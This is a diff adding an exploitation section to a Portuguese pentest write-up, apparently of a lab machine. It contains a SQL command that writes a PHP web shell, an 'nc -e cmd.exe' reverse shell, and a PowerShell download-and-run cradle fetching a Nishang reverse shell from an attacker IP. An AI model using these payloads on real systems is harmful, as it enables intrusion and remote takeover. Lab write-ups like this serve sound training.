@@ -113,3 +113,92 @@ Com o acesso root ao phpMyAdmin garantido, a próxima fase envolve:
 4. **Escalabilidade:** Avalie a possibilidade de usar o acesso ao banco de dados para escalar privilégios dentro do sistema, ou para comprometer outros sistemas na rede.
 
 5. **Análise de logs:** Verifique se há logs ou registros de atividades no phpMyAdmin que possam ser úteis para mapear outras atividades suspeitas ou para encobrir rastros.
+
+
+## Exploitation
+
+### Shell Uploading no Servidor Web via phpMyAdmin
+
+Com o acesso root ao phpMyAdmin garantido, podemos agora explorar o sistema mais profundamente utilizando técnicas de **shell uploading**. Usaremos o artigo [Shell Uploading in Web Server through PhpMyAdmin](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/) como ponto de apoio para ajudar na nossa exploração.
+
+### Criando uma Shell no Servidor Web
+
+1. **Criação de uma nova database:**
+   Primeiramente, crie uma nova base de dados no phpMyAdmin para realizar a exploração. No exemplo, criamos uma database chamada `anakein`.
+
+   ![image](https://github.com/user-attachments/assets/556a160a-5c9a-4e19-8316-17da7308f8e6)
+
+
+3. **Injeção de código PHP malicioso:**
+   Em seguida, execute o seguinte comando SQL na nova database para criar um arquivo de shell PHP no servidor web:
+
+   ```
+   SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp/www/shell.php';
+   ```
+
+   ![image](https://github.com/user-attachments/assets/e38c460b-79e8-441c-b8d2-8ce3a7a33dea)
+
+   Esse comando cria um arquivo chamado shell.php no diretório C:/wamp/www/ do servidor web. O arquivo contém um simples script PHP que executa comandos passados via URL.
+
+   Verificação da criação da shell: Para verificar se o arquivo shell.php foi criado corretamente, acesse a URL a seguir no navegador:
+
+   http://192.168.185.189:8080/shell.php?cmd=dir
+
+   ![image](https://github.com/user-attachments/assets/bdc95e53-cfae-4619-9525-650dec95e455)
+
+    Se a página listar os diretórios do Windows, significa que a shell foi criada com sucesso e está funcionando corretamente.
+
+### Próximos Passos: Obtendo uma Reverse Shell
+
+Agora que temos uma shell funcional, o próximo objetivo é obter uma reverse shell para ganhar acesso remoto ao sistema com mais controle. Isso pode ser feito executando um comando através da shell que conecte o servidor de volta ao seu sistema, permitindo que você interaja com o sistema operacional diretamente.
+
+Aqui está um exemplo de comando que pode ser utilizado para obter uma reverse shell:
+
+http://192.168.185.189:8080/shell.php?cmd=nc -e cmd.exe [YOUR_IP] [PORT]
+
+    [YOUR_IP]: Substitua pelo seu endereço IP.
+    [PORT]: Substitua pela porta que você estará ouvindo.
+
+Antes de executar o comando acima, certifique-se de ter uma sessão de netcat escutando na porta especificada:
+
+```
+nc -lvnp [PORT]
+```
+
+Se tudo correr bem, você deverá obter uma conexão reverse shell, permitindo explorar o sistema alvo com privilégios de linha de comando.
+
+### Obtendo a Reverse Shell com Nishang
+
+Para obter uma reverse shell mais robusta, utilizei o **Nishang**, um framework de PowerShell, que oferece diversos scripts úteis para pentesters. Especificamente, utilizei o payload **Invoke-PowerShellTcp.ps1** para estabelecer a conexão.
+
+#### Execução do Payload
+
+Utilizei o seguinte comando via shell PHP para executar o payload do Nishang e obter uma reverse shell:
+
+```
+http://192.168.185.189:8080/shell.php?cmd=powershell%20-NoP%20-NonI%20-W%20Hidden%20-Exec%20Bypass%20-Command%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://192.168.45.171/Invoke-PowerShellTcp.ps1%27);%20Invoke-PowerShellTcp%20-Reverse%20-IPAddress%20192.168.45.171%20-Port%20443
+```
+
+- **IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.171/Invoke-PowerShellTcp.ps1')**: Esse trecho do comando baixa e executa o script `Invoke-PowerShellTcp.ps1` diretamente da minha máquina atacante.
+- **Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.171 -Port 443**: Essa parte do comando executa o script baixado, instruindo-o a iniciar uma conexão reverse shell de volta para minha máquina, especificando o endereço IP e a porta.
+
+#### Preparação da Máquina Atacante
+
+Antes de executar o payload, certifique-se de que sua máquina atacante esteja preparada para receber a conexão. Para isso, utilize o **netcat** ou outra ferramenta de escuta na porta especificada:
+
+```
+nc -lvnp 443
+```
+
+![image](https://github.com/user-attachments/assets/d0275d46-4efd-40b8-8ec6-0a2ca55c6d82)
+
+#### Resultado
+
+Se o payload for executado corretamente, você obterá uma reverse shell com privilégios, permitindo que você interaja diretamente com o sistema operacional da máquina alvo através do terminal.
+
+![image](https://github.com/user-attachments/assets/18646561-f3aa-42d7-96b3-df8839be472f)
+
+### Conclusão
+
+Utilizando o Nishang, foi possível estabelecer uma reverse shell através de um comando PowerShell, o que permitiu um controle completo sobre o sistema alvo. Essa técnica é poderosa e eficaz para cenários onde o acesso ao sistema operacional é necessário para explorar mais profundamente a máquina comprometida.
+
